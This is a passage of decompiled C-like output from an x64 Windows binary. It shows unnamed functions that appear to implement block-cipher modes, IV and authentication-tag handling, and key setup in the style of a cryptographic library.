    while ( v11 + a3 <= v9 );
  }
  return 1i64;
}

//----- (0000000140056EF0) ----------------------------------------------------
__int64 __fastcall sub_140056EF0(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  unsigned __int8 *v9; // rbx
  __int64 v10; // rax
  unsigned __int8 *v11; // rbx
  __int64 v12; // rax
  int v14; // [rsp+68h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v14 = sub_140024D40(a1);
      v9 = (unsigned __int8 *)sub_140024D20(a1);
      v10 = sub_140024D00(a1);
      sub_14008C810(a3, a2, 0x40000000, v10, v9, &v14);
      sub_140024D70(a1, v14);
      a3 += 0x40000000;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v14 = sub_140024D40(a1);
    v11 = (unsigned __int8 *)sub_140024D20(a1);
    v12 = sub_140024D00(a1);
    sub_14008C810(a3, a2, v4, v12, v11, &v14);
    sub_140024D70(a1, v14);
  }
  return 1i64;
}

//----- (0000000140057010) ----------------------------------------------------
const char *sub_140057010()
{
  return "[";
}

//----- (0000000140057020) ----------------------------------------------------
void *sub_140057020()
{
  return &unk_1400F9130;
}

//----- (0000000140057030) ----------------------------------------------------
void *sub_140057030()
{
  return &unk_1400F91F0;
}

//----- (0000000140057040) ----------------------------------------------------
void *sub_140057040()
{
  return &unk_1400F9190;
}

//----- (0000000140057050) ----------------------------------------------------
__int64 __fastcall sub_140057050(__int64 a1, __int64 a2)
{
  int v4; // edi
  __int64 v5; // rax

  v4 = sub_140024D30(a1);
  v5 = sub_140024D00(a1);
  sub_14008CA00(v5, v4, a2);
  return 1i64;
}

//----- (00000001400570A0) ----------------------------------------------------
__int64 __fastcall sub_1400570A0(__int64 a1, _BYTE *a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  int v9; // edi
  unsigned int *v10; // rbx
  _DWORD *v11; // rax
  int v12; // edi
  unsigned int *v13; // rbx
  _DWORD *v14; // rax

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v9 = sub_140024CF0(a1);
      v10 = (unsigned int *)sub_140024D20(a1);
      v11 = (_DWORD *)sub_140024D00(a1);
      sub_14008E150(a3, a2, 0x40000000u, v11, v10, v9);
      a3 += 0x40000000i64;
      a2 += 0x40000000;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v12 = sub_140024CF0(a1);
    v13 = (unsigned int *)sub_140024D20(a1);
    v14 = (_DWORD *)sub_140024D00(a1);
    sub_14008E150(a3, a2, v4, v14, v13, v12);
  }
  return 1i64;
}

//----- (00000001400571A0) ----------------------------------------------------
__int64 __fastcall sub_1400571A0(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  int v9; // edi
  unsigned __int8 *v10; // rsi
  _DWORD *v11; // rax
  int v13; // [rsp+88h] [rbp+20h] BYREF

  v4 = 0x40000000i64;
  v5 = a4;
  if ( a4 < 0x40000000 )
    v4 = a4;
  if ( !a4 )
    return 1i64;
  do
  {
    if ( v5 < v4 )
      break;
    v13 = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (unsigned __int8 *)sub_140024D20(a1);
    v11 = (_DWORD *)sub_140024D00(a1);
    sub_14008F070(a3, a2, v5, v11, v10, &v13, v9);
    sub_140024D70(a1, v13);
    v5 -= v4;
    a3 += v4;
    a2 += v4;
    if ( v5 < v4 )
      v4 = v5;
  }
  while ( v5 );
  return 1i64;
}

//----- (0000000140057290) ----------------------------------------------------
__int64 __fastcall sub_140057290(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // rsi
  __int64 v10; // r15
  __int64 v11; // r14
  int v12; // ebx
  _DWORD *v13; // rax

  v8 = *(int *)(sub_140021BD0(a1) + 4);
  if ( a4 >= v8 )
  {
    v9 = a4 - v8;
    v10 = a2 - a3;
    v11 = -a3;
    do
    {
      v12 = sub_140024CF0(a1);
      v13 = (_DWORD *)sub_140024D00(a1);
      sub_14008E080(a3, (_BYTE *)(v10 + a3), v13, v12);
      a3 += v8;
    }
    while ( v11 + a3 <= v9 );
  }
  return 1i64;
}

//----- (0000000140057340) ----------------------------------------------------
__int64 __fastcall sub_140057340(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  unsigned __int8 *v9; // rbx
  __int64 v10; // rax
  unsigned __int8 *v11; // rbx
  __int64 v12; // rax
  int v14; // [rsp+68h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v14 = sub_140024D40(a1);
      v9 = (unsigned __int8 *)sub_140024D20(a1);
      v10 = sub_140024D00(a1);
      sub_14008F290(a3, a2, 0x40000000, v10, v9, &v14);
      sub_140024D70(a1, v14);
      a3 += 0x40000000;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v14 = sub_140024D40(a1);
    v11 = (unsigned __int8 *)sub_140024D20(a1);
    v12 = sub_140024D00(a1);
    sub_14008F290(a3, a2, v4, v12, v11, &v14);
    sub_140024D70(a1, v14);
  }
  return 1i64;
}

//----- (0000000140057460) ----------------------------------------------------
void *sub_140057460()
{
  return &unk_1400F9250;
}

//----- (0000000140057470) ----------------------------------------------------
void *sub_140057470()
{
  return &unk_1400F92B0;
}

//----- (0000000140057480) ----------------------------------------------------
void *sub_140057480()
{
  return &unk_1400F9370;
}

//----- (0000000140057490) ----------------------------------------------------
void *sub_140057490()
{
  return &unk_1400F9310;
}

//----- (00000001400574A0) ----------------------------------------------------
__int64 __fastcall sub_1400574A0(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  __int64 v8; // rbx
  __int64 v9; // rax
  unsigned int v11[6]; // [rsp+40h] [rbp-18h] BYREF

  v8 = sub_140024D00(a1);
  v11[0] = sub_140024D40(a1);
  v9 = sub_140024D20(a1);
  sub_1400911D0(a3, a2, a4, v8, v9, v11, *(void (__fastcall **)(__int64, __int64, __int64))(v8 + 248));
  sub_140024D70(a1, v11[0]);
  return 1i64;
}
// 1400574A0: using guessed type unsigned int var_18[6];

//----- (0000000140057550) ----------------------------------------------------
__int64 __fastcall sub_140057550(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  __int64 v8; // rdi
  int v9; // ebx
  __int64 v10; // rax
  unsigned int v12[10]; // [rsp+40h] [rbp-28h] BYREF

  v8 = sub_140024D00(a1);
  v12[0] = sub_140024D40(a1);
  v9 = sub_140024CF0(a1);
  v10 = sub_140024D20(a1);
  sub_1400915F0(a3, a2, a4, v8, v10, v12, v9, *(__int64 (__fastcall **)(__int64, __int64, __int64))(v8 + 248));
  sub_140024D70(a1, v12[0]);
  return 1i64;
}
// 140057550: using guessed type unsigned int var_28[10];

//----- (0000000140057600) ----------------------------------------------------
__int64 __fastcall sub_140057600(__int64 a1, __int64 a2, char *a3, __int64 a4)
{
  __int64 v8; // rdi
  int v9; // ebx
  _OWORD *v10; // rax
  int v12; // [rsp+40h] [rbp-28h] BYREF

  v8 = sub_140024D00(a1);
  v12 = sub_140024D40(a1);
  v9 = sub_140024CF0(a1);
  v10 = (_OWORD *)sub_140024D20(a1);
  sub_140091520(a3, a2, a4, v8, v10, (int)&v12, v9, *(void (__fastcall **)(_OWORD *, _OWORD *, __int64))(v8 + 248));
  sub_140024D70(a1, v12);
  return 1i64;
}

//----- (00000001400576B0) ----------------------------------------------------
__int64 __fastcall sub_1400576B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v8; // r14
  int v9; // ebx
  __int128 *v10; // rax
  unsigned __int64 v11; // r8
  unsigned __int64 v12; // rbp
  int v13; // ebx
  __int128 *v14; // rax
  int v16[4]; // [rsp+40h] [rbp-28h] BYREF

  v8 = sub_140024D00(a1);
  if ( (unsigned int)sub_140024D80(a1, 0x2000u) )
  {
    v16[0] = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (__int128 *)sub_140024D20(a1);
    v11 = a4;
LABEL_8:
    sub_140091340(
      a3,
      a2,
      v11,
      v8,
      v10,
      (int)v16,
      v9,
      *(void (__fastcall **)(__int128 *, __int128 *, __int64))(v8 + 248));
    sub_140024D70(a1, v16[0]);
    return 1i64;
  }
  if ( a4 >= 0x1000000000000000i64 )
  {
    v12 = a4 >> 60;
    a4 += 0xF000000000000000ui64 * (a4 >> 60);
    do
    {
      v16[0] = sub_140024D40(a1);
      v13 = sub_140024CF0(a1);
      v14 = (__int128 *)sub_140024D20(a1);
      sub_140091340(
        a3,
        a2,
        0x8000000000000000ui64,
        v8,
        v14,
        (int)v16,
        v13,
        *(void (__fastcall **)(__int128 *, __int128 *, __int64))(v8 + 248));
      sub_140024D70(a1, v16[0]);
      --v12;
    }
    while ( v12 );
  }
  if ( a4 )
  {
    v16[0] = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (__int128 *)sub_140024D20(a1);
    v11 = 8 * a4;
    goto LABEL_8;
  }
  return 1i64;
}

//----- (0000000140057840) ----------------------------------------------------
__int64 __fastcall sub_140057840(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  __int64 v8; // rsi
  void (__fastcall *v9)(_BYTE *, _BYTE *, unsigned __int64); // rbp
  _QWORD *v10; // rbx
  unsigned __int8 *v11; // rax
  unsigned int v13[4]; // [rsp+40h] [rbp-28h] BYREF

  v13[0] = sub_140024D40(a1);
  v8 = sub_140024D00(a1);
  v9 = *(void (__fastcall **)(_BYTE *, _BYTE *, unsigned __int64))(v8 + 256);
  v10 = (_QWORD *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
  v11 = (unsigned __int8 *)sub_140024D20(a1);
  if ( v9 )
    sub_140090F60(a3, a2, a4, v8, v11, v10, v13, v9);
  else
    sub_140090D60(
      a3,
      a2,
      a4,
      v8,
      (__int64)v11,
      (__int64)v10,
      v13,
      *(void (__fastcall **)(__int64, __int64, __int64))(v8 + 248));
  sub_140024D70(a1, v13[0]);
  return 1i64;
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (0000000140057930) ----------------------------------------------------
__int64 __fastcall sub_140057930(__int64 a1)
{
  __int64 result; // rax
  __int64 v3; // rbx
  void *v4; // rbx

  result = sub_140024D00(a1);
  v3 = result;
  if ( result )
  {
    sub_140023440(result + 256, 392i64);
    v4 = *(void **)(v3 + 648);
    if ( v4 != (void *)sub_140024D20(a1) )
      sub_14001D930(v4);
    return 1i64;
  }
  return result;
}

//----- (00000001400579B0) ----------------------------------------------------
__int64 __fastcall sub_1400579B0(__FrameHandler3::TryBlockMap *a1, int a2, int a3, _QWORD *a4)
{
  size_t v5; // rsi
  __int64 v8; // rdi
  __int64 result; // rax
  void *v10; // rbx
  void *v11; // rax
  void *v12; // rax
  const void *v13; // rax
  int v14; // eax
  __int64 v15; // rcx
  __int64 v16; // rdx
  bool v17; // zf
  __int64 v18; // rax
  int v19; // ebx
  unsigned int v20; // edi
  unsigned int v21; // edi
  __int64 v22; // rbx
  __int64 v23; // rax
  void *v24; // rax

  v5 = a3;
  v8 = sub_140024D00((__int64)a1);
  switch ( a2 )
  {
    case 0:
      *(_QWORD *)(v8 + 248) = 0i64;
      *(_DWORD *)(v8 + 656) = __FrameHandler3::TryBlockMap::getNumTryBlocks(a1);
      *(_QWORD *)(v8 + 648) = sub_140024D20((__int64)a1);
      result = 1i64;
      *(_DWORD *)(v8 + 660) = -1;
      *(_DWORD *)(v8 + 664) = 0;
      *(_DWORD *)(v8 + 668) = -1;
      return result;
    case 8:
      v22 = sub_140024D00((__int64)a4);
      v23 = *(_QWORD *)(v8 + 640);
      if ( v23 )
      {
        if ( v23 != v8 )
          return 0i64;
        *(_QWORD *)(v22 + 640) = v22;
      }
      if ( *(_QWORD *)(v8 + 648) == sub_140024D20((__int64)a1) )
      {
        *(_QWORD *)(v22 + 648) = sub_140024D20((__int64)a4);
        return 1i64;
      }
      else
      {
        v24 = sub_14001D8E0(*(int *)(v8 + 656));
        *(_QWORD *)(v22 + 648) = v24;
        if ( !v24 )
          return 0i64;
        memmove(v24, *(const void **)(v8 + 648), *(int *)(v8 + 656));
        return 1i64;
      }
    case 9:
      if ( (int)v5 <= 0 )
        return 0i64;
      if ( (int)v5 > 16 && (int)v5 > *(_DWORD *)(v8 + 656) )
      {
        v10 = *(void **)(v8 + 648);
        if ( v10 != (void *)sub_140024D20((__int64)a1) )
          sub_14001D930(v10);
        v11 = sub_14001D8E0(v5);
        *(_QWORD *)(v8 + 648) = v11;
        if ( !v11 )
          return 0i64;
      }
      *(_DWORD *)(v8 + 656) = v5;
      return 1i64;
    case 16:
      if ( (unsigned int)(v5 - 1) > 0xF || !(unsigned int)sub_140024CF0((__int64)a1) || *(int *)(v8 + 660) < 0 )
        return 0i64;
      v13 = (const void *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
      memmove(a4, v13, v5);
      return 1i64;
    case 17:
      if ( (unsigned int)(v5 - 1) > 0xF || (unsigned int)sub_140024CF0((__int64)a1) )
        return 0i64;
      v12 = (void *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
      memmove(v12, a4, v5);
      result = 1i64;
      *(_DWORD *)(v8 + 660) = v5;
      return result;
    case 18:
      if ( (_DWORD)v5 == -1 )
      {
        memmove(*(void **)(v8 + 648), a4, *(int *)(v8 + 656));
LABEL_20:
        *(_DWORD *)(v8 + 664) = 1;
        return 1i64;
      }
      if ( (int)v5 < 4 || *(_DWORD *)(v8 + 656) - (int)v5 < 8 )
        return 0i64;
      memmove(*(void **)(v8 + 648), a4, v5);
      if ( !(unsigned int)sub_140024CF0((__int64)a1)
        || (int)sub_140025460(v5 + *(_QWORD *)(v8 + 648), *(_DWORD *)(v8 + 656) - (int)v5) > 0 )
      {
        goto LABEL_20;
      }
      return 0i64;
    case 19:
      if ( !*(_DWORD *)(v8 + 664) || !*(_DWORD *)(v8 + 248) )
        return 0i64;
      sub_140092830(v8 + 256, *(const __m128i **)(v8 + 648), *(int *)(v8 + 656));
      if ( (int)v5 <= 0 || (v14 = *(_DWORD *)(v8 + 656), (int)v5 > v14) )
      {
        v14 = *(_DWORD *)(v8 + 656);
        LODWORD(v5) = v14;
      }
      memmove(a4, (const void *)(*(_QWORD *)(v8 + 648) + v14 - (__int64)(int)v5), (int)v5);
      v15 = *(int *)(v8 + 656) + *(_QWORD *)(v8 + 648);
      v16 = -(*(int *)(v8 + 656) - 8i64 + *(_QWORD *)(v8 + 648));
      do
        v17 = (*(_BYTE *)--v15)++ == 0xFF;
      while ( v17 && v16 + v15 );
      *(_DWORD *)(v8 + 252) = 1;
      return 1i64;
    case 22:
      if ( (_DWORD)v5 != 13 )
        return 0i64;
      v18 = __crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
      *(_QWORD *)v18 = *a4;
      *(_DWORD *)(v18 + 8) = *((_DWORD *)a4 + 2);
      *(_BYTE *)(v18 + 12) = *((_BYTE *)a4 + 12);
      *(_DWORD *)(v8 + 668) = 13;
      v19 = *(unsigned __int8 *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 11) << 8;
      v20 = v19 | *(unsigned __int8 *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 12);
      if ( v20 < 8 )
        return 0i64;
      v21 = v20 - 8;
      if ( !(unsigned int)sub_140024CF0((__int64)a1) )
      {
        if ( v21 < 0x10 )
          return 0i64;
        LOWORD(v21) = v21 - 16;
      }
      *(_BYTE *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 11) = BYTE1(v21);
      *(_BYTE *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 12) = v21;
      return 16i64;
    case 24:
      if ( !*(_DWORD *)(v8 + 664) || !*(_DWORD *)(v8 + 248) || (unsigned int)sub_140024CF0((__int64)a1) )
        return 0i64;
      memmove((void *)(*(_QWORD *)(v8 + 648) + *(int *)(v8 + 656) - v5), a4, v5);
      sub_140092830(v8 + 256, *(const __m128i **)(v8 + 648), *(int *)(v8 + 656));
      result = 1i64;
      *(_DWORD *)(v8 + 252) = 1;
      return result;
    default:
      return 0xFFFFFFFFi64;
  }
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (0000000140057EA0) ----------------------------------------------------
__int64 __fastcall sub_140057EA0(__int64 a1, _DWORD *a2, const __m128i *a3)
{
  __int64 v6; // rax
  __m128i *v7; // rbx
  int v8; // eax
  unsigned __int64 v9; // r8

  v6 = sub_140024D00(a1);
  v7 = (__m128i *)v6;
  if ( a3 )
  {
    if ( !a2 )
    {
      v9 = *(int *)(v6 + 656);
      if ( *(_DWORD *)(v6 + 248) )
        sub_140092830(v6 + 256, a3, v9);
      else
        memmove(*(void **)(v6 + 648), a3, v9);
      v7[15].m128i_i32[3] = 1;
      v7[41].m128i_i32[2] = 0;
      return 1i64;
    }
  }
  else if ( !a2 )
  {
    return 1i64;
  }
  v8 = sub_140024D30(a1);
  sub_1400902A0(a2, 8 * v8, (unsigned int *)v7);
  sub_140092710(v7 + 16, (__int64)v7, (void (__fastcall *)(__m128i *, __m128i *, __int64))sub_14008FA50);
  v7[42].m128i_i64[0] = 0i64;
  if ( a3 || v7[15].m128i_i32[3] && (a3 = (const __m128i *)v7[40].m128i_i64[1]) != 0i64 )
  {
    sub_140092830((unsigned __int64)&v7[16], a3, v7[41].m128i_i32[0]);
    v7[15].m128i_i32[3] = 1;
  }
  v7[15].m128i_i32[2] = 1;
  return 1i64;
}

//----- (0000000140057FC0) ----------------------------------------------------
__int64 __fastcall sub_140057FC0(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4)
{
  _DWORD *v8; // rax
  _DWORD *v9; // rdi
  __int64 result; // rax
  bool v11; // zf
  __int64 v12; // rcx
  void (__fastcall *v13)(char *, _BYTE *, __int64, __int64, __int64); // rax
  unsigned __int64 v14; // rbx
  __int64 v15; // rax
  void *v16; // rax

  v8 = (_DWORD *)sub_140024D00(a1);
  v9 = v8;
  if ( !v8[62] )
    return 0xFFFFFFFFi64;
  if ( (int)v8[167] >= 0 )
    return sub_140059990(a1, (__int64)a2, (__int64)a3, a4);
  if ( !v8[63] )
    return 0xFFFFFFFFi64;
  if ( a3 )
  {
    if ( a2 )
    {
      v11 = (unsigned int)sub_140024CF0(a1) == 0;
      v12 = (__int64)(v9 + 64);
      v13 = (void (__fastcall *)(char *, _BYTE *, __int64, __int64, __int64))*((_QWORD *)v9 + 84);
      if ( v11 )
      {
        if ( v13 )
        {
          if ( (unsigned int)sub_140091CE0(v12, a3, a2, a4, v13) )
            return 0xFFFFFFFFi64;
        }
        else if ( (unsigned int)sub_1400919B0(v12, (__int64)a3, a2, a4) )
        {
          return 0xFFFFFFFFi64;
        }
      }
      else if ( v13 )
      {
        if ( (unsigned int)sub_1400922E0(v12, a3, a2, a4, v13) )
          return 0xFFFFFFFFi64;
      }
      else if ( (unsigned int)sub_140091F90(v12, a3, a2, a4) )
      {
        return 0xFFFFFFFFi64;
      }
    }
    else if ( (unsigned int)sub_140091880((__int64)(v8 + 64), a3, a4) )
    {
      return 0xFFFFFFFFi64;
    }
    return (unsigned int)a4;
  }
  else
  {
    if ( (unsigned int)sub_140024CF0(a1) )
    {
      v16 = (void *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
      sub_140092AB0((__int64)(v9 + 64), v16, 0x10ui64);
      v9[165] = 16;
    }
    else
    {
      if ( (int)v9[165] < 0 )
        return 0xFFFFFFFFi64;
      v14 = (int)v9[165];
      v15 = __crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
      if ( (unsigned int)sub_1400925A0((__int64)(v9 + 64), v15, v14) )
        return 0xFFFFFFFFi64;
    }
    result = 0i64;
    v9[63] = 0;
  }
  return result;
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (0000000140058160) ----------------------------------------------------
__int64 __fastcall sub_140058160(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rbx
  __int64 v7; // rcx
  __int64 v8; // rax
  __int64 v10; // rdx

  v6 = sub_140024D00(a1);
  if ( a2 == 8 )
  {
    v7 = sub_140024D00(a4);
    v8 = *(_QWORD *)(v6 + 496);
    if ( v8 )
    {
      if ( v8 != v6 )
        return 0i64;
      *(_QWORD *)(v7 + 496) = v7;
    }
    v10 = *(_QWORD *)(v6 + 504);
    if ( v10 )
    {
      if ( v10 != v6 + 248 )
        return 0i64;
      *(_QWORD *)(v7 + 504) = v7 + 248;
    }
  }
  else
  {
    if ( a2 )
      return 0xFFFFFFFFi64;
    *(_QWORD *)(v6 + 496) = 0i64;
    *(_QWORD *)(v6 + 504) = 0i64;
  }
  return 1i64;
}

//----- (0000000140058230) ----------------------------------------------------
__int64 __fastcall sub_140058230(__int64 a1, _DWORD *a2, _OWORD *a3, int a4)
{
  __int64 v8; // rax
  __int64 v9; // rsi
  int v10; // edx
  int v11; // ebx
  int v12; // eax

  v8 = sub_140024D00(a1);
  v9 = v8;
  if ( !a3 )
  {
    if ( !a2 )
      return 1i64;
    goto LABEL_5;
  }
  if ( a2 )
  {
LABEL_5:
    *(_QWORD *)(v8 + 528) = 0i64;
    v10 = 4 * sub_140024D30(a1);
    if ( a4 )
    {
      sub_1400902A0(a2, v10, (unsigned int *)v9);
      *(_QWORD *)(v9 + 512) = sub_14008FA50;
    }
    else
    {
      sub_140090050(a2, v10, (unsigned int *)v9);
      *(_QWORD *)(v9 + 512) = sub_14008F480;
    }
    v11 = 4 * sub_140024D30(a1);
    v12 = sub_140024D30(a1);
    sub_1400902A0((_DWORD *)((char *)a2 + v12 / 2), v11, (unsigned int *)(v9 + 248));
    *(_QWORD *)(v9 + 520) = sub_14008FA50;
    *(_QWORD *)(v9 + 496) = v9;
  }
  if ( a3 )
  {
    *(_QWORD *)(v9 + 504) = v9 + 248;
    *(_OWORD *)sub_140024D20(a1) = *a3;
  }
  return 1i64;
}

//----- (0000000140058350) ----------------------------------------------------
_BOOL8 __fastcall sub_140058350(__int64 a1, __int64 a2, _QWORD *a3, unsigned __int64 a4)
{
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 *v10; // r15
  __int64 v11; // rax
  int v13; // ebx
  __m128i *v14; // rax

  v8 = (_QWORD *)sub_140024D00(a1);
  v9 = v8;
  v10 = v8 + 62;
  if ( !v8[62] || !v8[63] || !a2 || !a3 || a4 < 0x10 )
    return 0i64;
  if ( v8[66] )
  {
    v11 = sub_140024D20(a1);
    ((void (__fastcall *)(_QWORD *, __int64, unsigned __int64, __int64, _QWORD, __int64))v9[66])(
      a3,
      a2,
      a4,
      *v10,
      v9[63],
      v11);
    return 1i64;
  }
  v13 = sub_140024CF0(a1);
  v14 = (__m128i *)sub_140024D20(a1);
  return !(unsigned int)sub_140093CA0(v10, v14, a3, a2, a4, v13);
}

//----- (0000000140058440) ----------------------------------------------------
__int64 __fastcall sub_140058440(__int64 a1, int a2, int a3, _DWORD *a4)
{
  unsigned __int64 v5; // rsi
  __int64 v8; // rdi
  __int64 result; // rax
  __int64 v10; // rax
  __int16 v11; // bx
  unsigned __int16 v12; // si
  unsigned __int16 v13; // si
  void *v14; // rax
  __int64 v15; // rax
  __int64 v16; // rcx

  v5 = a3;
  v8 = sub_140024D00(a1);
  switch ( a2 )
  {
    case 0:
      *(_DWORD *)(v8 + 264) = 8;
      *(_QWORD *)(v8 + 248) = 0i64;
      *(_QWORD *)(v8 + 256) = 0i64;
      result = 1i64;
      *(_DWORD *)(v8 + 268) = 12;
      *(_DWORD *)(v8 + 272) = -1;
      return result;
    case 8:
      v15 = sub_140024D00((__int64)a4);
      v16 = *(_QWORD *)(v8 + 328);
      if ( v16 )
      {
        if ( v16 != v8 )
          return 0i64;
        *(_QWORD *)(v15 + 328) = v15;
      }
      return 1i64;
    case 9:
      LODWORD(v5) = 15 - v5;
      goto LABEL_12;
    case 16:
      if ( !(unsigned int)sub_140024CF0(a1)
        || !*(_DWORD *)(v8 + 256)
        || !sub_140093C50((unsigned __int8 *)(v8 + 280), a4, v5) )
      {
        return 0i64;
      }
      *(_QWORD *)(v8 + 252) = 0i64;
      *(_DWORD *)(v8 + 260) = 0;
      return 1i64;
    case 17:
      if ( (v5 & 1) != 0 || (unsigned int)(v5 - 4) > 0xC )
        return 0i64;
      if ( (unsigned int)sub_140024CF0(a1) )
      {
        if ( a4 )
          return 0i64;
      }
      else if ( a4 )
      {
        *(_DWORD *)(v8 + 256) = 1;
        v14 = (void *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
        memmove(v14, a4, v5);
      }
      *(_DWORD *)(v8 + 268) = v5;
      return 1i64;
    case 18:
      if ( (_DWORD)v5 != 4 )
        return 0i64;
      *(_DWORD *)sub_140024D20(a1) = *a4;
      return 1i64;
    case 20:
LABEL_12:
      if ( (unsigned int)(v5 - 2) > 6 )
        return 0i64;
      *(_DWORD *)(v8 + 264) = v5;
      return 1i64;
    case 22:
      if ( (_DWORD)v5 != 13 )
        return 0i64;
      v10 = __crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
      *(_QWORD *)v10 = *(_QWORD *)a4;
      *(_DWORD *)(v10 + 8) = a4[2];
      *(_BYTE *)(v10 + 12) = *((_BYTE *)a4 + 12);
      *(_DWORD *)(v8 + 272) = 13;
      v11 = *(unsigned __int8 *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 11) << 8;
      v12 = v11 | *(unsigned __int8 *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 12);
      if ( v12 < 8u )
        return 0i64;
      v13 = v12 - 8;
      if ( (unsigned int)sub_140024CF0(a1) )
        goto LABEL_8;
      if ( v13 < *(int *)(v8 + 268) )
        return 0i64;
      v13 -= *(_WORD *)(v8 + 268);
LABEL_8:
      *(_BYTE *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 11) = HIBYTE(v13);
      *(_BYTE *)(__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1) + 12) = v13;
      return *(unsigned int *)(v8 + 268);
    default:
      return 0xFFFFFFFFi64;
  }
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (0000000140058700) ----------------------------------------------------
__int64 __fastcall sub_140058700(__int64 a1, _DWORD *a2, const void *a3)
{
  __int64 v6; // rdi
  int v7; // eax
  size_t v8; // rbx
  void *v9; // rax

  v6 = sub_140024D00(a1);
  if ( a3 )
  {
    if ( !a2 )
      goto LABEL_6;
  }
  else if ( !a2 )
  {
    return 1i64;
  }
  v7 = sub_140024D30(a1);
  sub_1400902A0(a2, 8 * v7, (unsigned int *)v6);
  sub_140093B60((_QWORD *)(v6 + 280), *(_DWORD *)(v6 + 268), *(_DWORD *)(v6 + 264), v6, (__int64)sub_14008FA50);
  *(_QWORD *)(v6 + 336) = 0i64;
  *(_DWORD *)(v6 + 248) = 1;
LABEL_6:
  if ( a3 )
  {
    v8 = 15 - *(_DWORD *)(v6 + 264);
    v9 = (void *)sub_140024D20(a1);
    memmove(v9, a3, v8);
    *(_DWORD *)(v6 + 252) = 1;
  }
  return 1i64;
}

//----- (00000001400587F0) ----------------------------------------------------
__int64 __fastcall sub_1400587F0(__int64 a1, __int64 *a2, _QWORD *a3, unsigned __int64 a4)
{
  _DWORD *v8; // rax
  _DWORD *v9; // rsi
  char *v10; // r12
  __int64 result; // rax
  unsigned __int64 v12; // rbx
  const void *v13; // rax
  unsigned __int64 v14; // rbx
  const void *v15; // rax
  bool v16; // zf
  void (__fastcall *v17)(__int64, __int64, unsigned __int64, __int64, char *, __int64); // rax
  int v18; // eax
  unsigned int v19; // edi
  int v20; // eax
  __int64 v21; // rbx
  __int64 v22; // rax
  char v23[16]; // [rsp+30h] [rbp-68h] BYREF

  v8 = (_DWORD *)sub_140024D00(a1);
  v9 = v8;
  v10 = (char *)(v8 + 70);
  if ( !v8[62] )
    return 0xFFFFFFFFi64;
  if ( (int)v8[68] >= 0 )
    return sub_1400597A0(a1, a2, a3, a4);
  if ( !v8[63] || !(unsigned int)sub_140024CF0(a1) && !v9[64] )
    return 0xFFFFFFFFi64;
  if ( !a2 )
  {
    if ( a3 )
    {
      if ( v9[65] || !a4 )
      {
        sub_140093080((__int64)v10, a3, a4);
        return (unsigned int)a4;
      }
    }
    else
    {
      v12 = 15 - v9[66];
      v13 = (const void *)sub_140024D20(a1);
      if ( !(unsigned int)sub_140093BA0(v10, v13, v12, a4) )
      {
        v9[65] = 1;
        return (unsigned int)a4;
      }
    }
    return 0xFFFFFFFFi64;
  }
  if ( !a3 )
    return 0i64;
  if ( !v9[65] )
  {
    v14 = 15 - v9[66];
    v15 = (const void *)sub_140024D20(a1);
    if ( (unsigned int)sub_140093BA0(v10, v15, v14, a4) )
      return 0xFFFFFFFFi64;
    v9[65] = 1;
  }
  v16 = (unsigned int)sub_140024CF0(a1) == 0;
